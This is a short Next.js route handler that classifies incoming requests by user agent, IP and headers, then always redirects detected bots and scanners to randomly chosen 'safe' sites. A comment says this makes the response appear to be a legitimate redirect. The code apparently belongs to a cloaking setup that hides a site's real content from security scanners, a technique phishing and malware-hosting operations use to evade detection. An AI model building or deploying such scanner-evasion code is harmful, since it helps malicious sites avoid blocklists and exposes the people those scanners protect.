// Scanner redirect endpoint - redirects bots/scanners to safe sites
import { NextRequest, NextResponse } from 'next/server'
import { classifyRequest, getRandomSafeRedirect } from '@/lib/scannerDetection'

export async function GET(request: NextRequest) {
  const userAgent = request.headers.get('user-agent') || 'Unknown'
  const ip =
    request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() ||
    request.headers.get('x-real-ip') ||
    'Unknown'

  const allHeaders: Record<string, string | null> = {
    'accept': request.headers.get('accept'),
    'accept-language': request.headers.get('accept-language'),
    'referer': request.headers.get('referer'),
    'x-requested-with': request.headers.get('x-requested-with'),
    'user-agent': userAgent,
  }

  const scannerDetection = await classifyRequest(userAgent, ip, allHeaders)

  // Always redirect to a safe site (appears as legitimate redirect)
  const safeRedirect = scannerDetection.redirectUrl || getRandomSafeRedirect()
  
  return NextResponse.redirect(safeRedirect, 302)
}

